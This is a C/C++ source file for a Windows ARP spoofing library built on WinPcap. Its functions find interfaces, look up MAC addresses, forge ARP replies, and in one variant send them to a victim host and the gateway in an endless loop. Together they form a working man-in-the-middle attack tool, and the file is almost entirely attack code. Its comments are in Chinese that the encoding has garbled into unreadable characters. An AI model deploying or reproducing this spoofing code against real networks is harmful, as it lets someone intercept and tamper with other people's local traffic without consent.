#include "stdAfx.h"
#include <stdio.h> 
#include "ArpSpoofLib.h" 
#include <Iphlpapi.h>

#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "packet.lib")
#pragma comment(lib, "Iphlpapi.lib")


#ifdef WIN32
#pragma comment(lib, "ws2_32.lib")
#endif


#define LOG_DEBUG TRACE
#define LOG_ERROR TRACE
#define LOG_INFO TRACE


/* From tcptraceroute, convert a numeric IP address to a string */
#define IPTOSBUFFERS	12
char *iptos(u_long in)
{
	static char output[IPTOSBUFFERS][3*4+3+1];
	static short which;
	u_char *p;

	p = (u_char *)&in;
	which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
	sprintf(output[which], "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
	return output[which];
}

char* ip6tos(struct sockaddr *sockaddr, char *address, int addrlen)
{
	socklen_t sockaddrlen;

#ifdef WIN32
	sockaddrlen = sizeof(struct sockaddr_in6);
#else
	sockaddrlen = sizeof(struct sockaddr_storage);
#endif


	if(getnameinfo(sockaddr, 
		sockaddrlen, 
		address, 
		addrlen, 
		NULL, 
		0, 
		NI_NUMERICHOST) != 0) address = NULL;

	return address;
}

/* Print all the available information on the given interface */
int ifprint(pcap_if_t *d, void *para)
{
	pcap_addr_t *a;
	char ip6str[128];

	/* Name */
	printf("%s\n",d->name);

	/* Description */
	if (d->description)
		printf("\tDescription: %s\n",d->description);

	/* Loopback Address*/
	printf("\tLoopback: %s\n",(d->flags & PCAP_IF_LOOPBACK)?"yes":"no");

	/* IP addresses */
	for(a=d->addresses;a;a=a->next) {
		printf("\tAddress Family: #%d\n",a->addr->sa_family);

		switch(a->addr->sa_family)
		{
		case AF_INET:
			printf("\tAddress Family Name: AF_INET\n");
			if (a->addr)
				printf("\tAddress: %s\n",
						iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
			if (a->netmask)
				printf("\tNetmask: %s\n",
						iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
			if (a->broadaddr)
				printf("\tBroadcast Address: %s\n",
						iptos(((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr));
			if (a->dstaddr)
				printf("\tDestination Address: %s\n",
						iptos(((struct sockaddr_in *)a->dstaddr)->sin_addr.s_addr));
			break;

		case AF_INET6:
			printf("\tAddress Family Name: AF_INET6\n");
			if (a->addr)
				printf("\tAddress: %s\n", ip6tos(a->addr, ip6str, sizeof(ip6str)));
			break;

		default:
			printf("\tAddress Family Name: Unknown\n");
			break;
		}
	}
	printf("\n");
	return 0;
}

int ListInterfaceInfomation(IfPrintCallBack callBack, void * para)
{
	int nRet = 0;
	char errbuf[PCAP_ERRBUF_SIZE];    //���󻺳��� 
	pcap_if_t * d;
	pcap_if_t * Devs;
	pcap_addr * pAddr;
	int i = 0;

	if(NULL == callBack)
		callBack = ifprint;

	/* ��ñ��������б� */ 
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &Devs, errbuf) == -1) 
	{ 
		LOG_ERROR("Error in pcap_findalldevs: %s\n", errbuf);
		return - 1;
	}

	/* ��ӡ�����б� */
	d = Devs;
	while(d)
	{
		nRet = callBack(d, para);
		if(nRet)
			break;

		d = d->next;
	} // ���� while(d)

	pcap_freealldevs(Devs);
}

/** 
* ���������MAC��ַ 
* pDevName �������豸���� 
*/ 
unsigned char* GetSelfMac(char* pDevName, unsigned char* mac)
{ 
	if(NULL == pDevName || NULL == mac)
	{
		LOG_ERROR("parametric (pDevName or mac) is set error\n");
		return NULL;
	}

	memset(mac,0,MAC_LENGTH); 
	if(!strncmp(PCAP_SRC_IF_STRING, pDevName, strlen(PCAP_SRC_IF_STRING)))
	{
		pDevName = pDevName + strlen(PCAP_SRC_IF_STRING);
	}
	else if(!strncmp(PCAP_SRC_FILE_STRING, pDevName, strlen(PCAP_SRC_FILE_STRING)))
	{
		pDevName = pDevName + strlen(PCAP_SRC_FILE_STRING);
	}// ���� if(!strncmp(PCAP_SRC_IF_STRING, pDevName, strlen(PCAP_SRC_IF_STRING)))

	LPADAPTER lpAdapter = PacketOpenAdapter(pDevName); 

	if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE)) 
	{ 
		printf("Device name is invalid\n");
		return NULL; 
	} 

	PPACKET_OID_DATA OidData = (PPACKET_OID_DATA)malloc(MAC_LENGTH + sizeof(PACKET_OID_DATA)); 
	if (OidData == NULL) 
	{ 
		PacketCloseAdapter(lpAdapter); 
		return NULL; 
	} 

	// 
	// Retrieve the adapter MAC querying the NIC driver 
	// 
	OidData->Oid = OID_802_3_CURRENT_ADDRESS; 

	OidData->Length = MAC_LENGTH; 
	memset(OidData->Data, 0, MAC_LENGTH); 
	BOOLEAN Status = PacketRequest(lpAdapter, FALSE, OidData); 
	if(Status) 
	{ 
		memcpy(mac, (u_char*)(OidData->Data), MAC_LENGTH); 
	} 
	free(OidData); 
	PacketCloseAdapter(lpAdapter); 
	return mac; 
}

int HexStringToCharArrary(char * pHexString, unsigned char* pCharArrary)
{
	int nRet = 0, nSize = 0;
	nSize = strlen(pHexString);
	if(MAC_LENGTH * 2 != nSize)
	{
		LOG_ERROR("Input hex string isn't equal 12\n");
		return -1;
	}// ���� if(MAC_LENGTH * 2 != nSize)

	for(int i = 0, j = 0; i < nSize; i ++, j++)
	{
		if(pHexString[i] >= '0' && pHexString[i] <= '9')
		{
			pCharArrary[j] = (pHexString[i] - '0');
		}
		else if(pHexString[i] >= _T('a') && pHexString[i] <= _T('f'))
		{
			pCharArrary[j] = (pHexString[i] - _T('a') + 10);
		}				
		else if(pHexString[i] >= _T('A') && pHexString[i] <= _T('F'))
		{
			pCharArrary[j] = (pHexString[i] - _T('A') + 10);
		}
		pCharArrary[j] <<= 4;
		i++;
		if(pHexString[i] >= '0' && pHexString[i] <= '9')
		{
			pCharArrary[j] += (pHexString[i] - '0');
		}
		else if(pHexString[i] >= _T('a') && pHexString[i] <= _T('f'))
		{
			pCharArrary[j] += (pHexString[i] - _T('a') + 10);
		}				
		else if(pHexString[i] >= _T('A') && pHexString[i] <= _T('F'))
		{
			pCharArrary[j] += (pHexString[i] - _T('A') + 10);
		}
	}

	return nRet;
}

/*!
\brief   ����arp��
\param   struct arp_packet * pPacket����ָ��
\param   unsigned char * pSrcMac    ��ԴMAC��ַ��6�ֽ�MAC��ַ����
\param   unsigned char * pDstMac    ��Ŀ��MAC��ַ��6�ֽ�MAC��ַ����
\param   unsigned long lSrcIp       ��ԴIP��4�ֽ�IP��ַ
\param   unsigned long lDstIp       ��Ŀ��IP
\return  ����Ϊ int ��
\version 1.0
\author  ��  ��
\date    2013/4/7 13:14:06
*/
int BuildArpPacket(
				    /*[in/out]*/struct arp_packet * pPacket,
					/*[in]*/unsigned char * pSrcMac,
					/*[in]*/unsigned char * pDstMac,
					/*[in]*/unsigned long lSrcIp,
					/*[in]*/unsigned long lDstIp,
					/*[in]*/unsigned short option/*��������*/
					)
{
	int nRet = 0;

	pPacket->eth.eh_type = htons(ETH_ARP);
	memcpy(pPacket->eth.source_mac, pSrcMac, MAC_LENGTH);
	memcpy(pPacket->eth.dest_mac, pDstMac, MAC_LENGTH);

	pPacket->arp.option = htons(option),
	//Ӳ�����ͣ�Ethernet��0x0001
	pPacket->arp.hardware_type = htons(ARP_HARDWARE);
	//�ϲ�Э�����ͣ�IPΪ0x0800
	pPacket->arp.protocol_type = htons(ETH_IP);
	//Ӳ����ַ���ȣ�MAC��ַ����Ϊ0x06
	pPacket->arp.add_len = MAC_LENGTH;
	//Э���ַ���ȣ�IP��ַ����Ϊ0x04
	pPacket->arp.pro_len = PROTOCOL_IP_LENGTH;
	memcpy(pPacket->arp.sour_addr, pSrcMac, MAC_LENGTH);
	pPacket->arp.sour_ip = lSrcIp;
	memcpy(pPacket->arp.dest_addr, pDstMac, MAC_LENGTH);
	pPacket->arp.dest_ip = lDstIp;
	memset(pPacket->arp.padding, 0, 18);

	return nRet;
}

/*!
\brief   ����arp��
\param   struct arp_packet * pPacket��
\param   char * pSrcMac             ��ԴMAC��ַ���ַ��������磺��1234567890ab��
\param   char * pDstMac             ��Ŀ��MAC��ַ
\param   char * pSrcIp              ��ԴIP���ַ��������磺��192.168.1.111��
\param   char * pDstIp              ��Ŀ��IP
\return  ����Ϊ int ��
\version 1.0
\author  ��  ��
\date    2013/4/7 14:00:39
*/
int BuildArpPacket(
					/*[in/out]*/struct arp_packet * pPacket,
					/*[in]*/char * pSrcMac,
					/*[in]*/char * pDstMac,
					/*[in]*/char * pSrcIp,
					/*[in]*/char * pDstIp,
					/*[in]*/unsigned short option/*��������*/
					)
{
	int nRet = 0;
	unsigned long lSrcIp, lDstIp;
	unsigned char srcMac[MAC_LENGTH], dstMac[MAC_LENGTH];
	nRet = HexStringToCharArrary(pSrcMac, srcMac);
	if(nRet)
	{
		return nRet;
	}// ���� if(nRet)

	nRet = HexStringToCharArrary(pDstMac, dstMac);
	if(nRet)
	{
		return nRet;
	}// ���� if(nRet)

	lSrcIp = inet_addr(pSrcIp);
	lDstIp = inet_addr(pDstIp);
	nRet = BuildArpPacket(pPacket, srcMac, dstMac, lSrcIp, lDstIp, option);

	return nRet;
}

int BuildArpRequest(
					/*[in/out]*/struct arp_packet * pPacket,
					/*[in]*/char * pSrcMac,
					/*[in]*/char * pDstMac,
					/*[in]*/char * pSrcIp,
					/*[in]*/char * pDstIp
					)
{
	int nRet = 0;

	nRet = BuildArpPacket(pPacket, pSrcMac, pDstMac, pSrcIp, pDstIp, ARP_REQUEST);
	return nRet;
}


int BuildArpReply(
					/*[in/out]*/struct arp_packet * pPacket,
					/*[in]*/char * pSrcMac,
					/*[in]*/char * pDstMac,
					/*[in]*/char * pSrcIp,
					/*[in]*/char * pDstIp
					)
{
	int nRet = 0;

	nRet = BuildArpPacket(pPacket, pSrcMac, pDstMac, pSrcIp, pDstIp, ARP_REPLY);
	return nRet;
}

/*!
\brief   ����arpӦ���
\param   struct arp_packet * pPacket����ָ��
\param   unsigned char * pSrcMac    ��ԴMAC��ַ��6�ֽ�MAC��ַ����
\param   unsigned char * pDstMac    ��Ŀ��MAC��ַ��6�ֽ�MAC��ַ����
\param   unsigned long lSrcIp       ��ԴIP��4�ֽ�IP��ַ
\param   unsigned long lDstIp       ��Ŀ��IP
\return  ����Ϊ int ��
\version 1.0
\author  ��  ��
\date    2013/4/7 13:14:06
*/
int BuildArpReply(
    /*[in/out]*/struct arp_packet * pPacket,
	/*[in]*/unsigned char * pSrcMac,
	/*[in]*/unsigned char * pDstMac,
	/*[in]*/char * pSrcIp,
	/*[in]*/char * pDstIp
	)
{
	int nRet = 0;
	unsigned long lSrcIp, lDstIp;
	lSrcIp = inet_addr(pSrcIp);
	lDstIp = inet_addr(pDstIp);
	nRet = BuildArpPacket(pPacket, pSrcMac, pDstMac, lSrcIp, lDstIp, ARP_REPLY);
	return nRet;
}

int ArpSpoof(
			 pcap_t * Handler, char * pszGatewayIp, char * pszGatewayMac,
			 char * pszHostIp, char * pszHostMac, char * pszLocalMac
			 )
{
	int nRet = 0;
	struct arp_packet packet;

	//�����غ������ֱ�ʱ������ƭ��
	//while(1)
	{
		BuildArpReply(&packet, pszLocalMac, pszHostMac, pszGatewayIp, pszHostIp);
		if(pcap_sendpacket(Handler, (const u_char * )&packet, 60) == -1)
		{
			LOG_DEBUG("pcap_sendpacket send arp spoof to host error.\n");
		}

		BuildArpReply(&packet, pszLocalMac, pszGatewayMac, pszHostIp, pszGatewayIp);
		if(pcap_sendpacket(Handler, (const u_char * )&packet, 60) == -1)
		{
			LOG_DEBUG("pcap_sendpacket send arp spoof to gateway error.\n");
		}
	} // ���� while(1)

	return nRet;
}


int ArpSpoof(
			 char * pszInterfaceName, char * pszGatewayIp, char * pszGatewayMac,
			 char * pszHostIp, char * pszHostMac, char * pszLocalMac
			 )
{
	int nRet = 0;
	struct arp_packet packet;
	pcap_t * pHandler;
	char errbuf[PCAP_ERRBUF_SIZE];    //���󻺳��� 

	/* ������ */ 
	if((pHandler = pcap_open(pszInterfaceName, // name of the device 
		65536, // portion of the packet to capture 
		0, //open flag 
		1000, // read timeout 
		NULL, // authentication on the remote machine 
		errbuf // error buffer 
		) ) == NULL) 
	{ 
		LOG_ERROR("\nUnable to open the adapter. %s is not supported by WinPcap\n",
			pszInterfaceName); 
		/* Free the device list */ 
		return -1; 
	} 

	//�����غ������ֱ�ʱ������ƭ��
	//while(1)
	{
		BuildArpReply(&packet, pszLocalMac, pszHostMac, pszGatewayIp, pszHostIp);
		if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
		{
			LOG_DEBUG("pcap_sendpacket send arp spoof to host error.\n");
		}

		BuildArpReply(&packet, pszLocalMac, pszGatewayMac, pszHostIp, pszGatewayIp);
		if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
		{
			LOG_DEBUG("pcap_sendpacket send arp spoof to gateway error.\n");
		}
	} // ���� while(1)

	pcap_close(pHandler); 
	return nRet;
}

int ArpSpoof(
			 char * pszInterfaceName, char * pszGatewayIp,
			 char * pszHostIp, int nInterval /*ms*/
			 )
{
    int nRet = 0;
	struct arp_packet packet;
	pcap_t * pHandler;
	char errbuf[PCAP_ERRBUF_SIZE];    //���󻺳��� 
	unsigned char gatewayMac[6] = {0};
	unsigned char hostMac[6] = {0};
	unsigned char localMac[6] = {0};

	GetSelfMac(pszInterfaceName, localMac);
	GetMac(pszGatewayIp, gatewayMac);
	GetMac(pszHostIp, hostMac);

	/* ������ */ 
	if((pHandler = pcap_open(pszInterfaceName, // name of the device 
		65536, // portion of the packet to capture 
		0, //open flag 
		1000, // read timeout 
		NULL, // authentication on the remote machine 
		errbuf // error buffer 
		) ) == NULL) 
	{ 
		LOG_ERROR("\nUnable to open the adapter. %s is not supported by WinPcap\n",
			pszInterfaceName); 
		/* Free the device list */ 
		return -1; 
	} 

	//�����غ������ֱ�ʱ������ƭ��
	while(1)
	{
		BuildArpReply(&packet, localMac, hostMac, pszGatewayIp, pszHostIp);
		if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
		{
			LOG_DEBUG("pcap_sendpacket send arp spoof to host error.\n");
		}

		BuildArpReply(&packet, localMac, gatewayMac, pszHostIp, pszGatewayIp);
		if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
		{
			LOG_DEBUG("pcap_sendpacket send arp spoof to gateway error.\n");
		}
		Sleep(nInterval);
	} // ���� while(1)

	pcap_close(pHandler); 
	return nRet;
}

int GetMac( /*[in]*/char * pszIp, /*[out]*/unsigned char * Mac)
{
	int nRet = 0;
	bool bDelete = false;
	MIB_IPNETTABLE table;
	PMIB_IPNETTABLE pIpNetTable = &table;
	ULONG nSize = sizeof(MIB_IPNETTABLE);
	DWORD dwIp = inet_addr(pszIp);
	memset(pIpNetTable, 0, nSize);

	nRet = GetIpNetTable(pIpNetTable, &nSize, false);
	if(NO_ERROR != nRet)
	{
		if(ERROR_INSUFFICIENT_BUFFER == nRet)
		{
			pIpNetTable = (PMIB_IPNETTABLE)new char[nSize];
			if(NULL == pIpNetTable)
			{
				return - 1;
			}// ���� if(NULL == pIpNetTable)
			bDelete = true;
		}
		else
		{
			return nRet;
		}// ���� if(ERROR_INSUFFICIENT_BUFFER == nRet)
	} // ���� if(NO_ERROR != nRet)

	memset(pIpNetTable, 0, nSize);
	nRet = GetIpNetTable(pIpNetTable, &nSize, false);
	if(NO_ERROR != nRet)
	{
		LOG_ERROR("GetIpNetTable error.nRet:\n", nRet);
		if(bDelete)
			delete []pIpNetTable;
		return nRet;
	}// ���� (pIpNetTable, &nSize, false)

	PMIB_IPNETTABLE * p;
	for(int i = 0; i < pIpNetTable->dwNumEntries; i++)
	{
		LOG_DEBUG("IP:%s; MAC:%2X-%2X-%2X-%2X-%2X-%2X\n",
			iptos(pIpNetTable->table[i].dwAddr),
			Mac[0], Mac[1], Mac[2], Mac[3], Mac[4], Mac[5], Mac[6]);
		if(dwIp == pIpNetTable->table[i].dwAddr)
		{
			memcpy(Mac, pIpNetTable->table[i].bPhysAddr, pIpNetTable->table[i].dwPhysAddrLen);
			if(bDelete)
			{
				delete []pIpNetTable;
			}
			return 0;
		} // ���� if(dwIp == pIpNetTable->table[i].dwAddr)
	} // ���� for(int i = 0; i < pIpNetTable->dwNumEntries; i++)

	
	if(bDelete)
		delete []pIpNetTable;

	return nRet;
}

const char * GetMacString(unsigned char * pMac)
{
	static char strMAC[20];
	sprintf(strMAC, "%02X%02X%02X%02X%02X%02X",
		pMac[0], pMac[1], pMac[2],
		pMac[3], pMac[4], pMac[5]);
	return strMAC;	
}

//
//int main(int argc,char* argv[]){ 
//	pcap_if_t *alldevs;               //ȫ�������б� 
//	pcap_if_t *d;                     //һ������ 
//	int inum;                         //�û�ѡ���������� 
//	int i=0;                          //ѭ������ 
//	pcap_t *adhandle;                 //һ��pcapʵ�� 
//	char errbuf[PCAP_ERRBUF_SIZE];    //���󻺳��� 
//	unsigned char mac[6], dstMac[6];             //����MAC��ַ 
//	struct arp_packet  packet;        //ARP�� 
//	unsigned long fakeIp;             //Ҫαװ�ɵ�IP��ַ 
//	pcap_addr_t *pAddr;               //������ַ 
//	unsigned long ip;                 //IP��ַ 
//	unsigned long netmask;            //�������� 
//
//	if(argc!=2){ 
//		printf("Usage: %s inet_addr\n",argv[0]); 
//		return -1; 
//	} 
//
//	//�Ӳ����б���Ҫαװ��IP��ַ 
//	fakeIp = inet_addr(argv[1]); 
//	if(INADDR_NONE==fakeIp){ 
//		fprintf(stderr,"Invalid IP: %s\n",argv[1]); 
//		return -1; 
//	} 
//
//	/* ��ñ��������б� */ 
//	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1) 
//	{ 
//		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf); 
//		exit(1); 
//	} 
//
//	/* ��ӡ�����б� */ 
//	for(d=alldevs; d; d=d->next) 
//	{ 
//		printf("%d", ++i); 
//		if (d->description) 
//		{
//			printf(". description:%s\n", d->description);
//			printf(". name:%s\n", d->name);
//		}
//		else 
//			printf(". No description available\n"); 
//	} 
//	//���û�з������� 
//	if(i==0) 
//	{ 
//		printf("\nNo interfaces found! Make sure WinPcap is installed.\n"); 
//		return -1; 
//	} 
//	//���û�ѡ��һ������ 
//	printf("Enter the interface number (1-%d):",i); 
//	scanf("%d", &inum); 
//
//	//����û�ѡ���������ų�����Ч��Χ�����˳� 
//	if(inum < 1 || inum > i) 
//	{ 
//		printf("\nInterface number out of range.\n"); 
//		/* Free the device list */ 
//		pcap_freealldevs(alldevs); 
//		return -1; 
//	} 
//
//	/* �ƶ�ָ�뵽�û�ѡ������� */ 
//	for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++); 
//
//	GetSelfMac(d->name, mac); //+8��ȥ��"rpcap://" 
//
//	printf("����ARP��ƭ��������(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X) ��ͼαװ��%s\n", 
//		mac[0],mac[1],mac[2],mac[3],mac[4],mac[5],argv[1]); 
//
//
//
//	/* ������ */ 
//	if ( (adhandle= pcap_open(d->name, // name of the device 
//		65536, // portion of the packet to capture 
//		0, //open flag 
//		1000, // read timeout 
//		NULL, // authentication on the remote machine 
//		errbuf // error buffer 
//		) ) == NULL) 
//	{ 
//		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", 
//			d->name); 
//		/* Free the device list */ 
//		pcap_freealldevs(alldevs); 
//		return -1; 
//	} 
//
//	HexStringToCharArrary("000000000000", dstMac);
//	BuildArpReply(&packet, mac, dstMac, "192.168.1.111", "192.168.1.10");
//	if(pcap_sendpacket(adhandle, (const u_char * )&packet, 60) == -1)
//	{
//		fprintf(stderr, "pcap_sendpacket error.\n");
//	}
//
//	pcap_close(adhandle);
//	//for(pAddr=d->addresses; pAddr; pAddr=pAddr->next){ 
//	//	//�õ��û�ѡ���������һ��IP��ַ 
//	//	ip = ((struct sockaddr_in *)pAddr->addr)->sin_addr.s_addr; 
//	//	//�õ���IP��ַ��Ӧ���������� 
//	//	netmask = ((struct sockaddr_in *)(pAddr->netmask))->sin_addr.S_un.S_addr; 
//	//	if (!ip || !netmask){ 
//	//		continue; 
//	//	} 
//	//	//�������IP��Ҫαװ��IP�Ƿ���ͬһ������ 
//	//	if((ip&netmask)!=(fakeIp&netmask)){ 
//	//		continue; //�������һ������������������ַ�б� 
//	//	} 
//
//	//	unsigned long netsize = ntohl(~netmask); //������������
//	//	unsigned long net = ip & netmask; //������ַ 
//
//	//	for(unsigned long n=1; n<netsize; n++){ 
//	//		//��į������IP��ַ�������ֽ�˳�� 
//	//		unsigned long destIp = net | htonl(n); 
//	//		//�����ٵ�ARP��������ﵽ����αװ�ɸ�����IP��ַ��Ŀ�� 
//	//		//packet = BuildArpPacket(mac,fakeIp,destIp); 
//	//		/*if(pcap_sendpacket(adhandle, packet, 60)==-1){ 
//	//			fprintf(stderr,"pcap_sendpacket error.\n"); 
//	//		} */
//	//	} 
//
//	////} 
//
//	return 0; 
//} 
//
